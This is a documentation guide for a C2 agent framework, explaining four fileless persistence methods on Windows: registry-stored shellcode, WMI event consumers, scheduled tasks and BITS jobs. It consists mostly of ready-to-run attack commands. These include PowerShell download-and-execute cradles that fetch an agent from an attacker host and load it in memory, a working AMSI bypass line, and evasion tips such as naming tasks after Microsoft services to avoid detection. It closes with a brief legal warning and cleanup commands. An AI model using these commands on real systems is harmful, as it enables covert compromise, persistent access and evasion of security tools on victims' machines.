# Fileless Persistence Guide

## Overview

C2R2-v2 now supports **100% fileless persistence** - persistence mechanisms that do NOT write any files to disk. This makes the agent significantly harder to detect by antivirus and EDR solutions, as there are no persistent disk artifacts.

## Why Fileless Persistence?

Traditional persistence methods (copying executable to disk, creating shortcuts, etc.) are easily detected by:
- Antivirus file scanning
- Behavioral analysis (file writes to suspicious locations)
- System integrity checks
- Forensic analysis

**Fileless persistence** solves this by storing the payload in memory-only locations:
- Windows Registry (as encrypted data)
- WMI Event Consumers (command execution)
- Scheduled Tasks (download from URL)
- BITS Jobs (background transfer)

## Available Fileless Methods

### 1. Registry Shellcode Persistence

**How it works:**
1. Converts agent to position-independent shellcode (via donut)
2. Encrypts shellcode with XOR
3. Stores encrypted shellcode in Windows Registry (split across multiple keys)
4. Creates a PowerShell loader in `HKCU\...\Run` that:
   - Reads encrypted shellcode from registry
   - Decrypts in memory
   - Executes via .NET Reflection (reflective loading)

**Advantages:**
- ✅ No files on disk at any point
- ✅ Shellcode stored in benign-looking registry keys
- ✅ PowerShell command is obfuscated
- ✅ Uses .NET System.Reflection for in-memory execution
- ✅ Survives reboots

**Limitations:**
- ❌ Requires PowerShell (usually available on Windows)
- ❌ May trigger AMSI/ETW if not bypassed
- ❌ Registry values can be large (may be suspicious)

**Agent command:**
```
persistence regshell
```

**Builder command:**
```bash
# Generate registry shellcode installer
./builder generate-stagers --url http://192.168.1.100:8080/agent.bin --shellcode agent_shellcode.bin --output stagers/
```

**Manual installation:**
```powershell
# Run the generated installer script
powershell -ExecutionPolicy Bypass .\install_registry_shellcode.ps1
```

**OPSEC Notes:**
- Registry keys mimic legitimate Windows configuration
- Shellcode is split into 8KB chunks (less suspicious than single large value)
- Uses obfuscated variable names and command abbreviations
- Includes AMSI bypass to evade Windows Defender

---

### 2. WMI Memory Execution Persistence

**How it works:**
1. Creates WMI Event Filter (triggers on system events)
2. Creates WMI Event Consumer with PowerShell command
3. Binds filter to consumer
4. PowerShell command downloads payload from URL
5. Executes payload directly in memory via .NET Reflection

**Advantages:**
- ✅ No files on disk
- ✅ WMI persistence is less commonly checked
- ✅ Download happens on-demand (no stored payload)
- ✅ Can trigger on various system events

**Limitations:**
- ❌ Requires network connectivity
- ❌ More easily detected by EDR (WMI monitoring)
- ❌ May require admin privileges for SYSTEM-level WMI
- ❌ Download may be logged by firewall/proxy

**Agent command:**
```
persistence wmimem
```

**Manual setup:**
```powershell
# Create WMI event filter
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name='SystemHealthCheck';
    EventNamespace='root\cimv2';
    QueryLanguage='WQL';
    Query="SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Create WMI event consumer
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name='SystemHealthAction';
    CommandLineTemplate='powershell.exe -NoP -W Hidden -C "$wc=New-Object Net.WebClient;$d=$wc.DownloadData(''http://192.168.1.100:8080/agent.bin'');[Reflection.Assembly]::Load($d).EntryPoint.Invoke($null,$null)"'
}

# Bind filter to consumer
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter=$filter;
    Consumer=$consumer
}
```

**Cleanup:**
```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -eq 'SystemHealthCheck'} | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -eq 'SystemHealthAction'} | Remove-WmiObject
```

---

### 3. Scheduled Task with Download + Memory Exec

**How it works:**
1. Creates scheduled task that runs on logon
2. Task executes PowerShell command (no script file)
3. PowerShell downloads payload from URL
4. Executes payload directly in memory via .NET Reflection

**Advantages:**
- ✅ No files on disk
- ✅ Scheduled tasks are common and less suspicious
- ✅ Download happens only when task triggers
- ✅ Easy to configure and manage

**Limitations:**
- ❌ Requires network connectivity
- ❌ Download may be logged by firewall/proxy
- ❌ Task XML may be inspected by security tools
- ❌ More visible than registry-based methods

**Agent command:**
```
persistence taskdl
```

**Manual setup:**
```batch
schtasks /Create /SC ONLOGON /TN "MicrosoftEdgeUpdateService" /TR "powershell.exe -NoP -W Hidden -C \"$wc=New-Object Net.WebClient;$d=$wc.DownloadData('http://192.168.1.100:8080/agent.bin');[Reflection.Assembly]::Load($d).EntryPoint.Invoke($null,$null)\"" /F /RL LIMITED
```

**Cleanup:**
```batch
schtasks /Delete /TN "MicrosoftEdgeUpdateService" /F
```

---

### 4. BITS Job Persistence

**How it works:**
1. Creates a BITS (Background Intelligent Transfer Service) job
2. Uses BITS notification commands to execute on download complete
3. Payload executes directly in memory
4. BITS transfers are low-priority and stealthy

**Advantages:**
- ✅ BITS is a legitimate Windows service
- ✅ Traffic appears as normal Windows updates
- ✅ Can survive reboots (persistent BITS jobs)
- ✅ Very stealthy (low priority, background transfer)
- ✅ Automatic retry on failure

**Limitations:**
- ❌ Requires network connectivity
- ❌ BITS logs may be monitored
- ❌ More complex to set up
- ❌ May be slower than direct download

**Agent command:**
```
persistence bits
```

**Manual setup:**
```powershell
# Create BITS job with notification
$job = Start-BitsTransfer -Source 'http://192.168.1.100:8080/agent.bin' -Destination '$env:TEMP\data.tmp' -Asynchronous -DisplayName 'WindowsUpdateBackup'
$job | Set-BitsTransfer -NotifyFlags Complete -NotifyCmdLine 'powershell.exe' "-NoP -W Hidden -C `$d=[IO.File]::ReadAllBytes('$env:TEMP\data.tmp');[IO.File]::Delete('$env:TEMP\data.tmp');`$a=[Reflection.Assembly]::Load(`$d);`$a.EntryPoint.Invoke(`$null,`$null)"
$job | Resume-BitsTransfer
```

**Cleanup:**
```powershell
Get-BitsTransfer -Name "WindowsUpdateBackup" -AllUsers | Remove-BitsTransfer
```

---

## Builder: Generating Fileless Persistence Stagers

The C2R2 builder can generate standalone stager scripts for each persistence method:

```bash
# Generate all stager types (PowerShell, VBS, HTA, Batch)
./builder generate-stagers --url http://192.168.1.100:8080/agent.bin --output stagers/

# Generate with shellcode for registry installation
./builder generate-stagers \
    --url http://192.168.1.100:8080/agent.bin \
    --shellcode agent_shellcode.bin \
    --output stagers/ \
    --amsi-bypass true
```

**Generated files:**
- `persistence_stager.ps1` - PowerShell stager with AMSI/ETW bypass
- `persistence_stager.vbs` - VBScript stager (legacy compatibility)
- `persistence_stager.hta` - HTML Application stager
- `persistence_stager.bat` - Batch + PowerShell wrapper
- `install_registry_shellcode.ps1` - Registry shellcode installer (if --shellcode provided)

---

## Complete Fileless Workflow

### 1. Build Agent as Shellcode

```bash
# Build agent
cargo build --release --target x86_64-pc-windows-gnu -p agent --features production

# Convert to shellcode using donut
donut -i target/x86_64-pc-windows-gnu/release/agent.exe -o agent_shellcode.bin -a 2 -f 1 -e 3
```

### 2. Generate Persistence Stagers

```bash
# Generate stagers with registry shellcode installer
./builder generate-stagers \
    --url http://192.168.1.100:8080/agent.bin \
    --shellcode agent_shellcode.bin \
    --output stagers/ \
    --amsi-bypass true
```

### 3. Host Payload

```bash
# Start simple HTTP server
cd stagers/
python3 -m http.server 8080
```

### 4. Deploy on Target

**Option A: Registry Shellcode (Most Stealthy)**
```powershell
# Download and run installer
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/install_registry_shellcode.ps1')
```

**Option B: Direct Stager Execution**
```powershell
# PowerShell stager
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/persistence_stager.ps1')

# Or download and run locally
Invoke-WebRequest -Uri 'http://192.168.1.100:8080/persistence_stager.ps1' -OutFile $env:TEMP\setup.ps1
powershell -ExecutionPolicy Bypass $env:TEMP\setup.ps1
Remove-Item $env:TEMP\setup.ps1
```

### 5. Verify Persistence

```powershell
# Check registry persistence
Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' | Select-Object SystemHealthMonitor

# Check WMI persistence
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -like '*Health*'}
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -like '*Health*'}

# Check scheduled tasks
schtasks /Query /TN "MicrosoftEdgeUpdateService"

# Check BITS jobs
Get-BitsTransfer -AllUsers | Where-Object {$_.DisplayName -like '*Update*'}
```

---

## Detection and OPSEC

### What Leaves Traces

**Registry Shellcode:**
- Large registry values in HKCU (encrypted, hard to analyze)
- PowerShell command in Run key (obfuscated)
- No file artifacts

**WMI Memory Exec:**
- WMI event filter and consumer (visible in WMI subscription)
- PowerShell command in consumer (obfuscated)
- Network traffic when downloading payload

**Scheduled Task Download:**
- Scheduled task entry (visible in Task Scheduler)
- PowerShell command in task action
- Network traffic when downloading payload

**BITS Job:**
- BITS job entry (visible in BITS admin)
- BITS transfer logs
- Network traffic (appears as Windows Update)

### Evasion Techniques Implemented

1. **AMSI Bypass** (PowerShell): Disables Windows Defender script scanning
2. **Obfuscated Commands**: Variable names, command abbreviations
3. **Benign Names**: Tasks/jobs named after legitimate Windows services
4. **.NET Reflection**: Loads assemblies in memory without disk writes
5. **XOR Encryption**: Payload encrypted in registry
6. **Chunking**: Large payloads split into smaller registry values

### Detection Bypass Tips

1. **Use HTTPS** for payload downloads (encrypted traffic)
2. **Host payload on legitimate-looking domain** (not raw IP)
3. **Use time-based triggers** (not immediate execution)
4. **Rotate persistence names** (don't reuse same names)
5. **Combine with evasion** (sleep delays, environment checks)
6. **Clean up after execution** (remove BITS jobs after initial run)

---

## Troubleshooting

### PowerShell Execution Policy

If PowerShell blocks execution:
```powershell
# Bypass execution policy
powershell -ExecutionPolicy Bypass -File stager.ps1

# Or permanently (not recommended on client systems)
Set-ExecutionPolicy Unrestricted -Scope CurrentUser
```

### AMSI Blocks Execution

If Windows Defender AMSI blocks the script:
```powershell
# The generated stagers include AMSI bypass
# If it still fails, try:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Then run the stager
.\persistence_stager.ps1
```

### Network Connectivity

If payload download fails:
1. Verify HTTP server is running: `curl http://192.168.1.100:8080/agent.bin`
2. Check firewall rules on both client and server
3. Use `Test-NetConnection` to verify connectivity
4. Try HTTPS if HTTP is blocked

### Persistence Not Triggering

1. **Check event logs** for errors: `Get-EventLog -LogName Application -Newest 20`
2. **Verify registry key exists**: `Get-ItemProperty 'HKCU:\...\Run'`
3. **Test PowerShell command manually** (copy from registry/task)
4. **Check if payload URL is accessible** from target machine

---

## Cleanup and Removal

### Agent Command

```
# Remove all persistence (fileless and traditional)
persistence remove
```

### Manual Removal

```powershell
# Remove registry persistence
Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SystemHealthMonitor' -ErrorAction SilentlyContinue
Remove-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts' -Recurse -ErrorAction SilentlyContinue

# Remove WMI persistence
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -like '*Health*'} | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -like '*Health*'} | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter.Name -like '*Health*'} | Remove-WmiObject

# Remove scheduled tasks
schtasks /Delete /TN "MicrosoftEdgeUpdateService" /F
schtasks /Delete /TN "WindowsDefenderUpdate" /F

# Remove BITS jobs
Get-BitsTransfer -AllUsers | Where-Object {$_.DisplayName -like '*Update*'} | Remove-BitsTransfer
```

---

## Security Considerations

⚠️ **LEGAL WARNING**: These techniques are for **authorized penetration testing and red team operations ONLY**.

- Always obtain written authorization before deployment
- Test in controlled environments first
- Be aware of detection signatures
- Use responsibly and ethically
- Clean up after engagement

⚠️ **Unauthorized access to computer systems is a crime. You have been warned.**

---

## References

- [MITRE ATT&CK T1547](https://attack.mitre.org/techniques/T1547/) - Boot or Logon Autostart Execution
- [MITRE ATT&CK T1546](https://attack.mitre.org/techniques/T1546/) - Event Triggered Execution
- [MITRE ATT&CK T1547.001](https://attack.mitre.org/techniques/T1547/001/) - Registry Run Keys
- [MITRE ATT&CK T1546.003](https://attack.mitre.org/techniques/T1546/003/) - Windows Management Instrumentation Event Subscription
- [MITRE ATT&CK T1053.005](https://attack.mitre.org/techniques/T1053/005/) - Scheduled Task
- [MITRE ATT&CK T1197](https://attack.mitre.org/techniques/T1197/) - BITS Jobs
